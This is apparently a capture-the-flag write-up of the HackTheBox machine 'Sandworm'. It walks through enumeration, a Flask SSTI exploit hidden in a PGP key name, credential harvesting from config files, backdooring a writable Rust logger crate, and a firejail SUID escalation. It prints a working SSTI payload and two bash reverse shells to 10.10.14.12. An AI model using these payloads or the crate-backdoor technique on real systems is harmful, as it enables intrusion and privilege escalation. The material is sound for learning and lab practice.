# Sandworm
## Enumeration:

Start with an nmap scan:
```vim
Nmap scan report for 10.10.11.218
Host is up (0.20s latency).
Not shown: 64281 closed tcp ports (conn-refused), 1251 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Issuer: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-04T18:03:25
| Not valid after:  2050-09-19T18:03:25
| MD5:   b8b7487ef3e214a4999ef842014159a1
|_SHA-1: 80d923678d7b43b2526d5d6100bd66e948ddc223
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This leaks `ssa.htb` as a domain, so we can add that to our `/etc/hosts`

We can try to do a subdirectory fuzzing with FFUF and see what endpoints we can access:
```vim
$ ffuf -u 'https://ssa.htb/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt:FUZZ -c -mc all -v -fw 27                           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://ssa.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 27
________________________________________________

[Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 303ms]
| URL | https://ssa.htb/admin
| --> | /login?next=%2Fadmin
    * FUZZ: admin

[Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 304ms]
| URL | https://ssa.htb/contact
    * FUZZ: contact

[Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 222ms]
| URL | https://ssa.htb/login
    * FUZZ: login

[Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 255ms]
| URL | https://ssa.htb/logout
| --> | /login?next=%2Flogout
    * FUZZ: logout

[Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 309ms]
| URL | https://ssa.htb/view
| --> | /login?next=%2Fview
    * FUZZ: view

[Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 312ms]
| URL | https://ssa.htb/about
    * FUZZ: about

[Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 243ms]
| URL | https://ssa.htb/process
    * FUZZ: process

[Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 222ms]
| URL | https://ssa.htb/guide
    * FUZZ: guide

[Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 221ms]
| URL | https://ssa.htb/pgp
    * FUZZ: pgp
```

I will now go through each endpoint (found via fuzzing or looking at the webapp) giving a short description for each:
1. `/admin`, `/logout` and `/view` redirect us to the `/login` page. Since we don't have any credentials, we can look into this later.
2. `/about`: is just a bunch of text talking about the SSA (Secret Spy Agency)
3. `/guide`: is providing the functionality to Decrypt and Encrypt text via PGP and to verify signed messages. It lets you practice things like signing, encrypting and decrypting messages by using the SSA's own public key
4. `/pgp`: is the SSA's public key
5. `/contact`: is for you to send PGP encrypted texts (encrypted with the SSA's public key) to the SSA
6. `/process`: is the endpoint used for verifying signed messages.

In the home page right at the bottom, we can see that this webapp is powered by Flask. This immediately had my attention towards SSTI, but I first had to find an endpoint which could possibly reflect text in order to perform this exploit.

I first try looking into `/contact` because I thought that there might also be a command injection exploit when trying to decrypt the PGP encrypted text. This attempt failed and I was neither getting any reflected text or any form of RCE via command injection, so I start looking at the `/guide` endpoint to see if anything works there.

## Exploit:

`/guide` allows you to enter your own PGP public key and signed message to verify it, which had me generating PGP keys in order to see if there is any SSTI possible:
```vim
┌──(kali㉿kali)-[~/sandworm]
└─$ gpg --full-generate-key 
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
  (14) Existing key from card
Your selection? 
RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (3072) 
Requested keysize is 3072 bits
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0) 
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: {{7*7}}
Email address: a@a.com
Comment: {{9*9}}
You selected this USER-ID:
    "{{7*7}} ({{9*9}}) <a@a.com>"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/505C38FF7B1287FFFC87A6FEE8050924E010BDB5.rev'
public and secret key created and signed.

pub   rsa3072 2023-06-22 [SC]
      505C38FF7B1287FFFC87A6FEE8050924E010BDB5
uid                      {{7*7}} ({{9*9}}) <a@a.com>
sub   rsa3072 2023-06-22 [E]

┌──(kali㉿kali)-[~/sandworm]
└─$ gpg --armor --export 505C38FF7B1287FFFC87A6FEE8050924E010BDB5

...

┌──(kali㉿kali)-[~/sandworm]
└─$ gpg --armor --sign lmao.txt
```

This will give us a public key and a signed message, now if enter this and try to verify the signed message, we get the following:

```
Signature is valid!

[GNUPG:] NEWSIG
gpg: Signature made Thu 22 Jun 2023 05:53:11 PM UTC
gpg:                using RSA key 505C38FF7B1287FFFC87A6FEE8050924E010BDB5
[GNUPG:] KEY_CONSIDERED 505C38FF7B1287FFFC87A6FEE8050924E010BDB5 0
[GNUPG:] SIG_ID 8LDM4vvSPuUjC1wVTI3W6FSUDmk 2023-06-22 1687456391
[GNUPG:] KEY_CONSIDERED 505C38FF7B1287FFFC87A6FEE8050924E010BDB5 0
[GNUPG:] GOODSIG E8050924E010BDB5 49 (81) <a@a.com>
gpg: Good signature from "49 (81) <a@a.com>" [unknown]
[GNUPG:] VALIDSIG 505C38FF7B1287FFFC87A6FEE8050924E010BDB5 2023-06-22 1687456391 0 4 0 1 10 00 505C38FF7B1287FFFC87A6FEE8050924E010BDB5
[GNUPG:] TRUST_UNDEFINED 0 pgp
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: 505C 38FF 7B12 87FF FC87  A6FE E805 0924 E010 BDB5
```

This has not only executed the `{{7*7}}` but also the `{{9*9}}`. Upon further testing, we realize that when you write SSTI payload in the comments part of the PGP key, then you can't use certain characters which lets us know that our main attack vector will be the `Real Name` part of the PGP key. We can try to make a PGP key to get a reverse shell, however a traditional reverse shell payload doesn't seem to work too well so we will alter our shell payload to be base64 encoded so that the RCE will simply decode and execute the decoded content.

```python
Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi85MDAwIDA+JjEK | base64 -d | bash').read() }}
```

This gives us a shell as `atlas`, however the shell seems to be a little weird as I cannot run commands like `rm` or `sudo` which had me a little confused. Looking into `var/www/html/SSA/SSA/__init__.py` we see the following:

```python
cat __init__.py
from flask import Flask
from flask_login import LoginManager
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

def create_app():
    app = Flask(__name__)

    app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'

    db.init_app(app)

    # blueprint for non-auth parts of app
    from .app import main as main_blueprint
    app.register_blueprint(main_blueprint)

    login_manager = LoginManager()
    login_manager.login_view = "main.login"
    login_manager.init_app(app)
    
    from .models import User
    @login_manager.user_loader
    def load_user(user_id):
        return User.query.get(int(user_id))

    return app
```

This gives us a potential password `GarlicAndOnionZ42` but I can't seem to SSH into the machine or try and access `mysql` so it doesn't seem to helpful either. The Flask cookie secret key isn't too much help either as we don't know the format of a normal cookie. The credentials don't work on `/login` either so we don't have anything of value here.

Looking into `/home` we see another user called `silentobserver` so there is probably some form of pivoting that we are going to have to do here.

Looking further, `/home/atlas/.config` has `firejail` and `httpie`. Firejail is a sandbox program made to prevent security breaches by restricting the environment. Going further, in `/home/atlas/.config/httpie/sessions/localhost_5000/admin.json` we have the following:

```json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

We can use the credentials above to SSH into the machine as `silentobserver`.

User Flag can be found in `/home/silentobserver/user.txt` 

## Privilege Escalation:

Looking at `linpeas.sh`, we can see that `silentobserver` can write to `/opt/crates/logger` directory and running `pspy64` gives you the following info:
```vim
2023/06/22 18:44:01 CMD: UID=0     PID=141456 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/22 18:44:01 CMD: UID=0     PID=141455 | /bin/echo e 
2023/06/22 18:44:01 CMD: UID=1000  PID=141457 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/22 18:44:01 CMD: UID=1000  PID=141458 | rustc -vV 
2023/06/22 18:44:01 CMD: UID=1000  PID=141459 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed                                                                                                                                                                                                                                           
2023/06/22 18:44:01 CMD: UID=1000  PID=141461 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg                                                                                                                                                                                                                                        
2023/06/22 18:44:01 CMD: UID=1000  PID=141463 | rustc -vV 
2023/06/22 18:44:11 CMD: UID=0     PID=141467 | /bin/bash /root/Cleanup/clean_c.sh 
2023/06/22 18:44:11 CMD: UID=0     PID=141468 | /bin/rm -r /opt/crates 
2023/06/22 18:44:11 CMD: UID=0     PID=141469 | /bin/cp -rp /root/Cleanup/crates /opt/ 
```

We can see `tipnet` and `cargo` being run. This seems to be some kind of rust program so I try to look into `/opt/tipnet` and find the following source code:
```rust
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");


    let mode = get_mode();
    
    if mode == "" {
            return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

        let valid = false;
        let mut mode = String::new();

        while ! valid {
                mode.clear();

                println!("Select mode of usage:");
                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

                io::stdin().read_line(&mut mode).unwrap();

                match mode.trim() {
                        "a" => {
                              println!("\n[+] Upstream selected");
                              return "upstream".to_string();
                        }
                        "b" => {
                              println!("\n[+] Muscular selected");
                              return "regular".to_string();
                        }
                        "c" => {
                              println!("\n[+] Tempora selected");
                              return "emperor".to_string();
                        }
                        "d" => {
                                println!("\n[+] PRISM selected");
                                return "square".to_string();
                        }
                        "e" => {
                                println!("\n[!] Refreshing indeces!");
                                return "pull".to_string();
                        }
                        "q" | "Q" => {
                                println!("\n[-] Quitting");
                                return "".to_string();
                        }
                        _ => {
                                println!("\n[!] Invalid mode: {}", mode);
                        }
                }
        }
        return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```


Here we see that the root command is running the `pull` option which is then performing some SQL queries and logging it. Since we have write permissions to the logger, I try to code in some form of shell command execution:

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let _output = Command::new("bash")
        .args(&["-c", "bash -i >& /dev/tcp/10.10.14.12/9001 0>&1"])
        .output()
        .expect("Failed to execute the command.");
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Compile the library with `cargo build` and once the cronjob is executed, you will have shell as `atlas` outside of firejail.

Looking at the `id` of atlas, you can see the `jailer` group which gives us access to run the `firejail` binary:
```vim
atlas@sandworm:~$ find / -group jailer -perm -4000 -exec ls -ld {} \; 2>/dev/null
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
```

Looking for firejail exploits, we can find the following [SetUID firejail exploit](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25) (You can read more about the exploit in this blog post here: https://www.openwall.com/lists/oss-security/2022/06/08/10)

```bash
atlas@sandworm:~$ chmod +x exploit.py
atlas@sandworm:~$ python3 exploit.py 
You can now run 'firejail --join=142388' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

We can start a new session, join the firejail container and then run `su root` (because `sudo` doesn't seem to work)

Root flag can be found in `/root/root.txt`
